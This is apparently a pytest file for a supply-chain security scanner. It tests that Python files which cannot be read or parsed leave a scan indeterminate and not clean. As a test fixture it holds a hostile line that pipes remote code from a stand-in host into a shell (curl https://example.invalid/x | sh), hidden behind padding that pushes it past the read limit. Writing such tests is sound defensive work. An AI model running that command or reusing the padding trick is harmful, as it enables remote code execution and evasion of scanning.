"""A Python file the scan could not read is declined by every rule that asked for it.

The target records such a file and the run turns it into an error, which a profile
can switch off with `fail_on_error: false`; the rule's own decline is what keeps that
run from passing. Every run here goes through the runner, because the question is
what the run concludes, not what one rule returns.
"""

from pathlib import Path

import pytest
from guardana.core.gate import GateOutcome, gate_outcome
from guardana.core.plugins import PluginMode, PluginTrust
from guardana.core.profile import FailOn, Policy, Profile
from guardana.core.registry import Registry
from guardana.core.report import ScanResult, ShortfallKind
from guardana.core.rule import RuleContext
from guardana.core.rule.fixture import FixtureOutcome, RuleFixture
from guardana.core.runner import Runner
from guardana.core.source import MAX_SOURCE_BYTES
from guardana.core.target import ArtifactTarget, Target
from guardana.rules import provide_rules

_RULES = (
    "guardana.supply_chain.code_execution",
    "guardana.supply_chain.dependency_risk",
    "guardana.supply_chain.hallucinated_package",
    "guardana.supply_chain.insecure_transport",
    "guardana.supply_chain.remote_code",
    "guardana.training.dataset_integrity",
)
_LIMIT = 64
_PAYLOAD = "import os\nos.system('curl https://example.invalid/x | sh')\n"
_SMALL = 64 * 1024


def _policy(include: tuple[str, ...]) -> Policy:
    return Policy(include=include, fail_on=FailOn(fail_on_error=False))


def _run(target: Target, policy: Policy) -> ScanResult:
    return Runner(
        Registry.discover(PluginTrust(mode=PluginMode.BUILTINS)),
        Profile(name="t", policy=policy),
    ).run(target)


def _declined(result: ScanResult, rule_id: str) -> tuple[list[str], list[str]]:
    """Return what `rule_id` itself declined: its unverified refs and its shortfall names."""
    refs = [f.target_ref for f in result.unverified if f.rule_id == rule_id]
    gaps = [
        gap.name
        for gap in result.coverage_shortfall
        if gap.kind is ShortfallKind.UNEXAMINED_COMPONENT and gap.detail.startswith(f"{rule_id} ")
    ]
    return refs, gaps


@pytest.mark.parametrize("rule_id", _RULES)
def test_a_file_past_the_read_limit_leaves_the_run_indeterminate_without_errors_failing(
    tmp_path: Path, rule_id: str
) -> None:
    loader = tmp_path / "run.py"
    loader.write_text("#" * _LIMIT + "\n" + _PAYLOAD, encoding="utf-8")
    policy = _policy((rule_id,))

    result = _run(ArtifactTarget(tmp_path, source_read_limit=_LIMIT), policy)

    assert gate_outcome(result, policy) is GateOutcome.INDETERMINATE
    assert _declined(result, rule_id) == ([str(loader)], [str(loader)])


@pytest.mark.parametrize("rule_id", _RULES)
def test_a_file_this_interpreter_cannot_parse_leaves_the_run_indeterminate(
    tmp_path: Path, rule_id: str
) -> None:
    broken = tmp_path / "broken.py"
    broken.write_text("def (:\n", encoding="utf-8")
    policy = _policy((rule_id,))

    result = _run(ArtifactTarget(tmp_path), policy)

    assert gate_outcome(result, policy) is GateOutcome.INDETERMINATE
    assert _declined(result, rule_id) == ([str(broken)], [str(broken)])


def test_a_loader_past_the_default_limit_is_not_a_clean_scan(tmp_path: Path) -> None:
    loader = tmp_path / "run.py"
    loader.write_text("#" * MAX_SOURCE_BYTES + "\n" + _PAYLOAD, encoding="utf-8")
    policy = _policy(("*",))

    result = _run(ArtifactTarget(tmp_path), policy)

    assert gate_outcome(result, policy) is GateOutcome.INDETERMINATE
    for rule_id in _RULES:
        assert _declined(result, rule_id) == ([str(loader)], [str(loader)]), rule_id


def _samples() -> list[tuple[str, RuleFixture]]:
    return [
        (rule.meta.id, fixture)
        for rule in provide_rules()
        if rule.meta.id in _RULES
        for fixture in rule.fixtures()
        if fixture.outcome is FixtureOutcome.INCONCLUSIVE
    ]


_SAMPLES = _samples()


def test_every_rule_samples_a_file_past_the_read_limit() -> None:
    assert sorted(rule_id for rule_id, _ in _SAMPLES) == sorted(_RULES)


@pytest.mark.parametrize(("rule_id", "fixture"), _SAMPLES, ids=[rule_id for rule_id, _ in _SAMPLES])
def test_the_sample_is_declined_by_the_rule_itself(rule_id: str, fixture: RuleFixture) -> None:
    rule = next(r for r in provide_rules() if r.meta.id == rule_id)
    ctx = RuleContext()

    reported = list((fixture.rule or rule).run(fixture.target, ctx))

    assert [f.verdict.outcome if f.verdict else None for f in reported] == ["inconclusive"]
    assert [gap.detail.split(" ")[0] for gap in ctx.shortfalls()] == [rule_id]
    assert "target's" not in fixture.note


@pytest.mark.parametrize(("rule_id", "fixture"), _SAMPLES, ids=[rule_id for rule_id, _ in _SAMPLES])
def test_the_sample_writes_no_large_file(rule_id: str, fixture: RuleFixture) -> None:
    root = Path(fixture.target.ref)
    written = sum(path.stat().st_size for path in root.rglob("*") if path.is_file())

    assert written <= _SMALL, rule_id
